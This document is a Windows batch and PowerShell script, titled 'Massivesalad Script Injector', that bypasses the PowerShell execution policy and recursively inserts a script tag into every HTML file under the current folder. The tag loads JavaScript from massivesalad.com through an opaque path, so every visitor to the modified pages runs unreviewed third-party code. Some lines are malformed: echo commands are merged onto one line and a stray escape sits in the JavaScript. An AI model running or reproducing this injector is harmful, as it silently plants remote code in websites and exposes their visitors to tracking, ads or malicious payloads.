@echo off
setlocal 

echo ========================================== echo Massivesalad Script Injector echo ========================================== echo. echo Starting... echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$script = @'
<script>
(function(arjplj){
var d = document,
	s=d.createElement('script'),
	l=d.scripts[d.scripts.length -1];
s.settings =arjplj || {};\s.src = ""\/\/massivesalad.com\/bj\/VXs.dKGylA0kYcWVcv\/LewmD9\/uoZrUzlNkRPXTUczzENfzyE-ztMzjREAtcNrztMA3VMYTXMQyxNIQu""; 
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade'; 
l.parentNode.insertBefore(s, l);
 })({}) 
</script>
'@; Get-ChildItem -Path . -Recurse -File -Include *.html,*.htm | ForEach-Object { $file=$_.FullName; $content=[System.IO.File]::ReadAllText($file); if($content -match 'massivesalad\.com'){ Write-Host ""SKIP (already installed): $file""; } elseif($content -match '(?i)<body\b[^>]*>'){ $newContent=[regex]::Replace($content,'(?i)(<body\b[^>]*>)','$1' + [Environment]::NewLine + $script,1); [System.IO.File]::WriteAllText($file,$newContent,(New-Object System.Text.UTF8Encoding($false))); Write-Host ""ADDED: $file""; } else { Write-Host ""NO BODY TAG: $file""; } }; Write-Host ''; Write-Host 'Finished.'; Read-Host 'Press Enter to exit'"

echo. echo ========================================== echo Finished! echo ========================================== echo. pause